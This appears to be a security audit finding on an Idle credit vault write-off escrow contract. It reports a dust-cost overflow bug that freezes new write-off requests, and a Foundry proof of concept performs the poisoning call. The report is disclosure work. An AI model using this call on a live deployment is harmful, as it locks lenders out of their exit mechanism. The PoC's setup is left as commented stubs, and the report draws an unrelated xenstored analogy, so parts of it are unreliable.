### Title
Dust write-off request with unbounded `underlyingsRequested` permanently saturates `pendingUnderlyings` and bricks the write-off market - ([File: contracts/IdleCreditVaultWriteOffEscrow.sol](contracts/IdleCreditVaultWriteOffEscrow.sol))

### Summary
`createWriteOffRequest` accepts an arbitrary `underlyingsRequested` value with no upper bound and no corresponding transfer of underlyings — only tranche tokens are escrowed. The value is added to the global counter `pendingUnderlyings`. A single request with `underlyingsRequested = type(uint256).max` (backed by a dust amount of tranche tokens, e.g. 1 wei) saturates the counter so that every subsequent `createWriteOffRequest` reverts on the Solidity 0.8.10 overflow check in `pendingUnderlyings += underlyingsRequested`. Like the xenstored crash on the illegal node path `/local/domain/`, a single malformed input clobbers shared state and takes the service down for all other users.

### Finding Description
In `IdleCreditVaultWriteOffEscrow.sol:86-102`, `createWriteOffRequest` pulls `amount` tranche tokens from the caller, but `underlyingsRequested` is purely a declared price — nothing verifies it is backed, bounded, or even plausible relative to the tranche's `virtualPrice`. It is accumulated unconditionally into `pendingUnderlyings` (line 101).

An attacker (any EOA holding ≥1 wei of tranche tokens; KYC gating only applies to deposits, not to holding/transferring tranche tokens, and a KYC'd lender is also an in-scope attacker) calls `createWriteOffRequest(1, type(uint256).max)` while an epoch is running. `pendingUnderlyings` becomes `2^256 - 1`. From then on, any honest lender calling `createWriteOffRequest` with any non-zero `underlyingsRequested` reverts on overflow — the crash is forced via the compiler-inserted assert-equivalent overflow check, directly analogous to the xenstored `assert()` path.

Cleanup paths do not rescue the protocol: `deleteWriteOffRequest` (line 112) and `fullfillWriteOffRequest` (line 134) subtract only `min(pendingUnderlyings, currentRequest.underlyings)`, so honest users can still exit, but the attacker's request itself can only be removed by the attacker. `emergencyWithdraw` can recover tokens but cannot reset `pendingUnderlyings` or `userRequests[attacker]`, so the owner has no on-chain recovery path either. The DoS persists for as long as the attacker leaves the request open — effectively permanent.

### Impact Explanation
The write-off escrow is the only trustless mechanism for lenders to exit distressed tranche positions at a negotiated discount and for the borrower to buy back debt for `writeOffDeposit`. Once `pendingUnderlyings` is saturated, no lender can ever open a new write-off request — the entire exit venue is frozen indefinitely. Lenders holding tranches of an impaired pool (precisely when write-off demand exists) lose the ability to liquidate at any price, a quantified impact equal to the full discounted-exit value of all tranche holders who would have used the escrow. This is permanent freezing of a payout channel caused by an unprivileged dust-cost input — not a gas or availability-only issue, since it destroys a real fund-exit mechanism and there is no admin recovery path for the corrupted counter.

### Likelihood Explanation
The attack costs ~1 wei of tranche tokens plus gas, requires no privileged role, no timing race, and no cooperation from any honest party. `isEpochRunning()` is the only gate, which is the normal operating state. Any KYC-passing lender or any holder who received tranche tokens on the secondary market can execute it at any time. The only mitigation is that existing requests remain fulfillable/deletable and the attacker could theoretically delete their own request — but a motivated attacker simply never does, or re-poisons the counter the moment a new epoch starts.

### Recommendation
Bound `underlyingsRequested` at request creation. Concretely, in `createWriteOffRequest` reject values that cannot correspond to the escrowed tranches, e.g. `if (underlyingsRequested > amount * _cdo.virtualPrice(tranche) / ONE_TRANCHE) revert NotAllowed();` (a lender should never ask more than par), or at minimum cap it to `type(uint128).max` and pack `WriteOffRequest` fields so two requests cannot overflow `pendingUnderlyings` (use `uint128`/`uint256` with a global ceiling). Alternatively track `pendingUnderlyings` with saturating/checked-math that cannot brick unrelated requests.

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IdleCreditVaultWriteOffEscrow, NotAllowed, Is0} from "../contracts/IdleCreditVaultWriteOffEscrow.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract PendingUnderlyingsOverflowPoC is Test {
    IdleCreditVaultWriteOffEscrow escrow;
    IERC20Detailed tranche;
    address attacker = makeAddr("attacker");
    address lender  = makeAddr("lender");

    function setUp() public {
        // Fork mainnet at a block where the vault epoch is running, then:
        // escrow = IdleCreditVaultWriteOffEscrow(<deployed escrow>);
        // tranche = IERC20Detailed(escrow.tranche());
    }

    function test_PoisonPendingUnderlyings() public {
        // Attacker holds dust tranche tokens (bought or received on secondary market).
        deal(address(tranche), attacker, 1);

        vm.startPrank(attacker);
        tranche.approve(address(escrow), 1);
        // Illegal input: 1 wei of tranches "priced" at 2^256-1 underlyings.
        escrow.createWriteOffRequest(1, type(uint256).max);
        vm.stopPrank();

        assertEq(escrow.pendingUnderlyings(), type(uint256).max);

        // Honest lender tries to open a real write-off request -> overflow revert.
        uint256 lenderTranches = 1000e18;
        deal(address(tranche), lender, lenderTranches);
        vm.startPrank(lender);
        tranche.approve(address(escrow), lenderTranches);
        vm.expectRevert(); // panic: arithmetic overflow on pendingUnderlyings += ...
        escrow.createWriteOffRequest(lenderTranches, 500e6);
        vm.stopPrank();

        // Owner cannot repair: emergencyWithdraw moves tokens, not accounting.
        // Attacker never deletes; the write-off market is frozen indefinitely.
    }
}
